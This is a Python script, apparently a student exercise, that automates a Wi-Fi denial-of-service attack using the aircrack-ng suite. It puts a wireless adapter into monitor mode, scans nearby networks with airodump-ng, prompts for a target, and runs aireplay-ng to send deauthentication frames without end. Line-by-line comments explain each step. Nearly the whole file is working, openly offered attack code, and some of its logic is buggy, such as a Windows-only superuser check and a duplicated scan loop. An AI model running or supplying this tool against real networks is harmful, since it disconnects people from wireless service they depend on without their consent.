# Ryan Liu
# Oct 7th, 2024  

#list alphabetically as per PEPE 8 recommendations 

import csv 
# this type of file (CSV) contains rows, this will help us read those rows easier. 
import ctypes

import sys

from datetime import datetime
# This will help keep track of the time and date in case we need to such as backing up a copy
import logging
# Tracks specific events that occur when program runs (0-7 levels)
import os
# Acts as a bridge between this python program and the operating system(interact with OS)
import re
# "regular expressions" will filter out specific information from a whole set of text; separating paths
import shutil
# This helps move files to a different folder (CSV)
import subprocess
# This will help running commands on Kali Linux for us
import tempfile
# This will create a temporary folder for backing up existing .CSV file to reduce organizational issues
import time
# This is a timer to pause activites before activating them again


logging.basicConfig(level=logging.INFO)
# Set the logging level (Emily Always Calls Eric When Network Is Down)
# Emergency, Alert, Critical, Error, Warning, Notice, Information, Debug
# Set log level to INFO for general updates

active_wifi_connections = []
# Create list for wireless networks 

def clear_screen():
    subprocess.call("clear", shell = True)
# This resets the terminal output, so that the user can view clean updated network data

def run_command(command):
    try:
        result = subprocess.run(command, capture_output = True, check = True)
        return result.stdout.decode()
# We will attempt to run a command to see if it works and return output (true) if it goes through with .stdout   
    except subprocess.CalledProcessError as e:
        logging.error(f"Command failed: {' '.join(command)}\nError: {e}")
        return None
# If error, then time-out and reserves it as e (why failure occured)
# We log this error with "command failed" and displays which command fails 
# These components allow a shell command to be executed and handles error with execution of commands that may occur

def is_essid_present(essid, lst): 
    return not any(essid in item["ESSID"] for item in lst)
# This checks if a given ESSID (Extended Service Set Identifer) which represents the name of a wireless network, it already present in the list of access points 
# If ESSID  is found in list (network is available), returns 'false" as we do not need to add to avoid duplication 
# If ESSID is not found, returns "true" as you can add ESSID to list 

def check_superuser(): 
    if os.name == "nt": 
        if not ctypes.windll.shell32.IsUserAnAdmin():
            print("Please run as an administrator before running script")
            sys.exit(1)
# This ensures the program is ran with superuser/superadmin/root privileges for elevated permissions to perform tasks
# If user is not 0, (!=) then it logs an error that it must run with "Sudo" superuser do
# EUID must be 0 

def archive_csv_files():
    with tempfile.TemporaryDirectory() as temp_backup_dir:
        for current_file in os.listdir():
            if current_file.endswith(".csv"):
                logging.info("Moving existing .csv files to backup directory")
                shutil.move(current_file, os.path.join(temp_backup_dir, f"{datetime.now()}-{current_file}"))
# This function moves .csv files in current directory to a temporary backup 
# backs up existing files to prevent overwrite and auto deletes temp using "with"
# Ensures only recent file remain in main directory, avoiding conflict if new files are created

def discover_wireless_adapters():
    adapter_pattern = re.compile("^wlan[0-9]+")
#can be "wlan0", cannot be "eth0" or "wlan-0" as it does not follow pattern
    iwconfig_output = run_command(["iwconfig"])
    wireless_interfaces = adapter_pattern.findall(iwconfig_output)
    if not wireless_interfaces:
        logging.error("No Wi-Fi adapters available. Connect one and try again")
        exit(1)
    return(wireless_interfaces)
# This finds/detects wireless interfaces on a system 
# We use re module to compile a regular expression of only "wlan" and "0 to 9" such as "wlan5"
# Run iwconfig to get wireless interface information 
# if not wireless interfaces = no wireless interfaces --> log as error with text for clarity
# exit (1) as in signals error --> script does not keep running, preventing loop

def terminate_conflicting_processes(): 
    logging.info("Terminating conflicting processes")
    run_command(["sudo", "airmon-ng", "check", "kill"])
# Used for terminating any processes that coflict with "airmon-ng" which this is used to manage wireless networks
# We will log this at level 6 as script will terminate conflicting process
# Run command to verify if process was terminated 

def enable_monitor_mode(interface):
    logging.info(f"Starting monitor mode{interface}")
    run_command(["sudo", "airmon-ng", "start", interface])
# Places wireless network interface into "monitor mode" allowing the wireless adapter to listen/capture wireless traffic
# Log at level 6 that monitor mode will begin along with the specific interface such as "wlan3"

def scan_networks(interface):
    logging.info(f"Scanning for networks on {interface}")
    process = subprocess.Popen(["sudo", "airodump-ng", "-w", "file", "--write-interval", "1", "--output-format", "csv", f"{interface}mon"],
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        while True:
            time.sleep(10)  # Adjust the time interval based on the needed update frequency
            load_access_points()
            show_access_points()
    except KeyboardInterrupt:
        logging.info("Scan interrupted by user.")
        process.terminate()
# Responsible for scanning close wireless networks using wireless interface that was put in monitor mode previously
# "Popen" starts the command and executes the rest of the script; allows commands to run in backround as network scanning is being conducted 
# stdout.DEVNULL will redirect standard output; silencing it to avoid clutter
# stderr- does the same thing, ensuring no error messages from "airodump" are displayed in the terminal
    try:
        while True:
            clear_screen()
            load_access_points()
            show_access_points()
            time.sleep(3)
    except KeyboardInterrupt:
        logging.info("Select target network")
        process.terminate()
# This is a loop meant for continuously displaying detected wireless access points per 3 seconds reducing cpu usage
# When targeted SSID is met, we must stop it with "KeybaordInterrupt" -- Ctrl+C
# As airodump-ng (network scan) was started as background process with "Popen", we can terminate it freeing up the wireless interface to conduct further actions 


def load_access_points():
    headers = ["BSSID", "ESSID", "First_time_seen", "Last_time_seen", "Authentication", "Cipher", "Privacy", "Speed", "channel", "beacons", "Power", "IV", "ID_Length", "Key"]
    for file_name in os.listdir():
        # Check if it is a file and ends with .csv
        if os.path.isfile(file_name) and file_name.endswith(".csv"):
            with open(file_name) as csv_file:
                csv_file.seek(0)
                csv_reader = csv.DictReader(csv_file, headers)
                for row in csv_reader:
                    if row["BSSID"] != "BSSID" and row["BSSID"] != "Station MAC" and is_essid_present(row["ESSID"], active_wifi_connections):
                        active_wifi_connections.append(row)
                        print(f"Added network: {row.get('ESSID', 'Hidden')} on channel {row.get('channel', 'Unknown')}")
# reads information about detected wireless networks from .csv file created by airodump-ng in a list we initially created "active_wifi_connections"
# headers --> list of expected columns from .csv file to types of data collected by airodump-ng
# Filter out files ending with only .csv and certain headers for displaying relevant information in list
# Process each row with "csv_reader" and filter out column headers suggested 
# If current SSID is not in list, returns "True" and adds network to list. Returns "False" if network is already in list to prevent duplication 

def show_access_points():
    print("Num |\tBSSID              |\tChannel|\tESSID")
    print("___ |\t___________________|\t_______|\t______________________________")
    for index, ap in enumerate(active_wifi_connections):
        # Use 'Unknown' if channel or ESSID is None
        channel = (ap['channel'] or 'Unknown').strip()
        essid = ap['ESSID'] or 'Hidden'
        print(f"{index}\t{ap['BSSID']}\t{channel}\t\t{essid}")

# Once networks are detected, we can display the networks in a formatted list 
# Such that, it will display, number of what network it is, "0,1,2,3,4", BSSID, channel(1,6,11 are common for 2.4Ghz), ESSID
# long \t refers to "tabs" to align column, in this case it goes 3,12,8,12
# To format data is a row, we use the enumerate function to provide index, and network data "ap"

def set_target_network(): 
    while True:
        try:
            selection = int(input("Please select a choice: "))
            if active_wifi_connections[selection]:
                return active_wifi_connections[selection]
        except (ValueError, IndexError):
            print("Invalid choice, please try again. ")
# Now, we must choose a network to perform the attack 
# A person must choose based off "int" meaning they can choose "1,2,3,4" as that interprets at "Num" or "index" from previous function(number corresponds to networks Num/index)
# If chosen, returns the network chose, if choice resolves to an error, user entered something different than "int" such as "2,34" or "number1"

def perform_dos_attack(interface, target_bssid, channel):
    logging.info(f"Switching {interface} to channel{channel} for DoS attack")
    run_command(["sudo", "airmon-ng", "start", f"{interface}mon", channel])
    logging.info(f"Starting DoS attack on {target_bssid}")
    run_command(["sudo", "aireplay-ng", "--deauth", "0", "-a", target_bssid, f"{interface}mon"])
# This function performs the attack which takes into account 3 parameter including interface "wlan0mon", target_BSSID "Mac Address", and channel "1,6,11"
# We log an info message stating we are switching interface to target network's channel
# Run command to verify if airmon-ng start command switches to interface of targeted network's channel("mon" = monitor mode)
# log a message stating which network will be targeted in relation to target_bssid
# Run "aireplay-ng" tp inject packets for deauthentication, as "0"--> attack will not stop sending deauthentication frames

if __name__ == "__main__":
    check_superuser()
    archive_csv_files()
    wireless_interfaces = discover_wireless_adapters()

    print("Available WiFi interfaces:")
    for i, iface in enumerate(wireless_interfaces):
        print(f"{i} - {iface}")

    while True:
        try:
            iface_choice = int(input("Pick interface to use for attack: "))
            if 0 <= iface_choice < len(wireless_interfaces):
                break
            else:
                print("Please enter a number corresponding to the interface listed.")
        except ValueError:
            print("Invalid input. Please enter a number.")
    
    selected_interface = wireless_interfaces[iface_choice]

# name = main --> We can import this script into another one without it running automatically in this one. 
# We check if superuser is performing/move existing .csv files to temp directory/find interfaces/adapters that can be put in monitor mode
# for i, iface --> this loop interates available interfaces, printing each with an index number such as 0-wlan0, 1-wlan1 
# User selects iterface of interest and program stores it

    terminate_conflicting_processes()
    enable_monitor_mode(selected_interface)
    scan_networks(selected_interface)
# This prepares for the attack by eliminating processes that conflict with monitor mode such as network manager, places wireless interface into monitor mode, scans close networks using "airodump-ng" displaying such headers 

    target_network = set_target_network()
    perform_dos_attack(selected_interface, target_network["BSSID"], target_network["channel"].strip())
# DoS attack is initated 


















